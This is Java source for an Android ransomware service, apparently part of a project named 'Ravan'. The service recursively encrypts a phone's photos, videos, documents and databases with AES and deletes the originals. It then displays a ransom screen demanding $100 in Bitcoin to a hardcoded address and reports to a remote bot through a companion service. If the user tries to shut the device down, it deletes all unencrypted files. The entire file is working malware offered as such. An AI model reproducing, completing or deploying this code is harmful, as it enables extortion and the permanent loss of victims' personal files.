package com.security.ravan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class RansomwareService extends Service {

    private static final String TAG = "RansomwareService";
    private static final String CHANNEL_ID = "RansomwareChannel";
    private static final int NOTIFICATION_ID = 3001;
    
    // کلید رمزنگاری (در عمل از سرور دریافت میشه)
    private static final String ENCRYPTION_KEY = "RavanRansomware2024SecretKey";
    private static final String BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    private static final int RANSOM_AMOUNT = 100; // دلار
    
    private boolean isShuttingDown = false;
    private int encryptedCount = 0;
    
    private BroadcastReceiver shutdownReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_SHUTDOWN.equals(intent.getAction())) {
                isShuttingDown = true;
                Log.w(TAG, "⚠️ Device is shutting down! Deleting all files...");
                deleteAllFiles();
                sendToBot("⚠️ کاربر قصد خاموش کردن گوشی را دارد! تمام فایل‌ها حذف شدند!");
            }
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        // ثبت receiver برای تشخیص خاموش شدن گوشی
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SHUTDOWN);
        registerReceiver(shutdownReceiver, filter);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Ransomware service started");
        
        // شروع به عنوان سرویس foreground
        startForeground(NOTIFICATION_ID, createNotification());
        
        // فعال کردن WakeLock برای جلوگیری از خواب گوشی حین رمزنگاری
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Ransomware:WakeLock");
        wakeLock.acquire(10 * 60 * 1000L); // 10 دقیقه
        
        // شروع رمزنگاری فایل‌ها
        encryptAllFiles();
        
        // نمایش صفحه باج
        showRansomScreen();
        
        wakeLock.release();
        
        return START_STICKY;
    }
    
    private void encryptAllFiles() {
        encryptedCount = 0;
        File storageDir = Environment.getExternalStorageDirectory();
        encryptDirectory(storageDir);
        
        String message = "⚠️ Ransomware completed! " + encryptedCount + " files encrypted.\n" +
                "💰 Ransom amount: $" + RANSOM_AMOUNT + " in Bitcoin\n" +
                "🏦 BTC Address: " + BTC_ADDRESS;
        
        sendToBot(message);
        Log.d(TAG, message);
    }
    
    private void encryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (isShuttingDown) return;
            
            if (file.isDirectory()) {
                encryptDirectory(file);
            } else if (isImportantFile(file.getName())) {
                encryptFile(file);
            }
        }
    }
    
    private boolean isImportantFile(String filename) {
        String[] importantExtensions = {
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
            ".mp4", ".mkv", ".avi", ".mov", ".wmv", ".flv",
            ".mp3", ".wav", ".aac", ".flac", ".ogg", ".m4a",
            ".pdf", ".doc", ".docx", ".txt", ".rtf", ".xls", ".xlsx", ".ppt", ".pptx",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".apk", ".db", ".sqlite", ".xml", ".json"
        };
        
        String lower = filename.toLowerCase();
        for (String ext : importantExtensions) {
            if (lower.endsWith(ext)) {
                return true;
            }
        }
        return false;
    }
    
    private void encryptFile(File file) {
        try {
            byte[] data = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            fis.read(data);
            fis.close();
            
            byte[] encrypted = encryptAES(data, ENCRYPTION_KEY);
            
            FileOutputStream fos = new FileOutputStream(file.getAbsolutePath() + ".encrypted");
            fos.write(encrypted);
            fos.close();
            
            file.delete();
            encryptedCount++;
            
            if (encryptedCount % 50 == 0) {
                Log.d(TAG, "Encrypted " + encryptedCount + " files so far");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error encrypting file: " + file.getAbsolutePath(), e);
        }
    }
    
    private byte[] encryptAES(byte[] data, String key) throws Exception {
        // استفاده از AES-256
        byte[] salt = new byte[16];
        SecureRandom random = new SecureRandom();
        random.nextBytes(salt);
        
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        PBEKeySpec spec = new PBEKeySpec(key.toCharArray(), salt, 10000, 256);
        SecretKey secretKey = factory.generateSecret(spec);
        SecretKeySpec keySpec = new SecretKeySpec(secretKey.getEncoded(), "AES");
        
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        
        byte[] iv = cipher.getIV();
        byte[] encrypted = cipher.doFinal(data);
        
        // ترکیب salt + iv + داده رمز شده
        byte[] result = new byte[salt.length + iv.length + encrypted.length];
        System.arraycopy(salt, 0, result, 0, salt.length);
        System.arraycopy(iv, 0, result, salt.length, iv.length);
        System.arraycopy(encrypted, 0, result, salt.length + iv.length, encrypted.length);
        
        return result;
    }
    
    private void showRansomScreen() {
        Intent intent = new Intent(this, RansomActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
    }
    
    private void deleteAllFiles() {
        File storageDir = Environment.getExternalStorageDirectory();
        deleteDirectory(storageDir);
        sendToBot("💀 تمام فایل‌های گوشی به دلیل خاموش کردن دستگاه حذف شدند!");
    }
    
    private void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                deleteDirectory(file);
            } else {
                if (!file.getName().endsWith(".encrypted")) {
                    file.delete();
                }
            }
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Ransomware Service",
                    NotificationManager.IMPORTANCE_HIGH);
            channel.setDescription("Ransomware is active");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, RansomActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("⚠️ SYSTEM LOCKED ⚠️")
                .setContentText("Your files have been encrypted! Tap for instructions.")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build();
    }
    
    private void sendToBot(String message) {
        Intent intent = new Intent(this, HttpServerService.class);
        intent.setAction("SEND_MESSAGE");
        intent.putExtra("message", message);
        startService(intent);
    }
    
    // متد رمزگشایی (برای تست)
    public static byte[] decryptAES(byte[] encryptedData, String key) throws Exception {
        byte[] salt = new byte[16];
        byte[] iv = new byte[16];
        byte[] data = new byte[encryptedData.length - 32];
        
        System.arraycopy(encryptedData, 0, salt, 0, 16);
        System.arraycopy(encryptedData, 16, iv, 0, 16);
        System.arraycopy(encryptedData, 32, data, 0, data.length);
        
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        PBEKeySpec spec = new PBEKeySpec(key.toCharArray(), salt, 10000, 256);
        SecretKey secretKey = factory.generateSecret(spec);
        SecretKeySpec keySpec = new SecretKeySpec(secretKey.getEncoded(), "AES");
        
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, new javax.crypto.spec.IvParameterSpec(iv));
        
        return cipher.doFinal(data);
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(shutdownReceiver);
        } catch (Exception e) {}
        Log.d(TAG, "Ransomware service destroyed");
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
